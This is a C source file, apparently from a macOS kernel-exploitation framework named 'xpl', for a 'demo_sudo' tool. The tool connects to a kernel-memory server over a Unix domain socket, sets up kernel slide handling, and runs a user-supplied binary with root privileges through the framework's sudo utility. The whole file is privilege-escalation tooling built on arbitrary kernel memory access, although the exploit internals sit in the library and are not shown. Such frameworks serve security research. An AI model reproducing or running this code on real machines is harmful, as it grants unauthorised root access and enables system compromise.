//
//  main.c
//  demo_sudo
//
//  Created by sreejith on 3/11/22.
//

#include <stdio.h>

#include <xpl/xpl.h>
#include <xpl/memory/kmem.h>
#include <xpl/memory/kmem_remote.h>
#include <xpl/slider/kernel.h>
#include <xpl/util/sudo.h>
#include <xpl/util/log.h>
#include <xpl/util/assert.h>
#include <xpl/util/misc.h>
#include <xpl/util/msdosfs.h>


void print_usage(void) {
    xpl_log_info("usage: demo_sudo [-k kmem_uds] path-to-binary [arg1] [arg2] ...");
}


int main(int argc, const char * argv[]) {
    const char* kmem_socket = XPL_DEFAULT_KMEM_SOCKET;
    
    int ch;
    while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
        switch (ch) {
            case 'k': {
                kmem_socket = optarg;
                break;
            }
            case '?':
            default: {
                print_usage();
                exit(1);
            }
        }
    }
    
    argc -= optind;
    argv += optind;
    
    if (argc < 1) {
        xpl_log_error("path to binary required");
        print_usage();
        exit(1);
    }
        
    xpl_log_debug("intializing kmem client");
    xpl_init();
    xpl_kmem_backend_t backend;
    int error = xpl_kmem_remote_client_create(kmem_socket, &backend);
    if (error) {
        xpl_log_error("failed to connect to kmem server unix domain socket %s, err: %s", kmem_socket, strerror(error));
        exit(1);
    }
    
    xpl_kmem_use_backend(backend);
    xpl_slider_kernel_init(xpl_kmem_remote_client_get_mh_execute_header(backend));
    
    xpl_log_debug("creating sudo utility");
    xpl_sudo_t sudo = xpl_sudo_create();
    
    const char* binary = argv[0];
    const char* args[argc - 1];
    for (int i=0; i<argc - 1; i++) {
        args[i] = argv[i + 1];
    }
    
    xpl_log_info("running binary %s", binary);
    int exit_status = xpl_sudo_run(sudo, binary, args, xpl_array_size(args));
    if (exit_status) {
        xpl_log_error("binary %s returned non zero exit status (status: %d)", binary, exit_status);
    } else {
        xpl_log_info("successfully ran binary with root privileges");
    }
    
    xpl_sudo_destroy(&sudo);
    return exit_status;
}
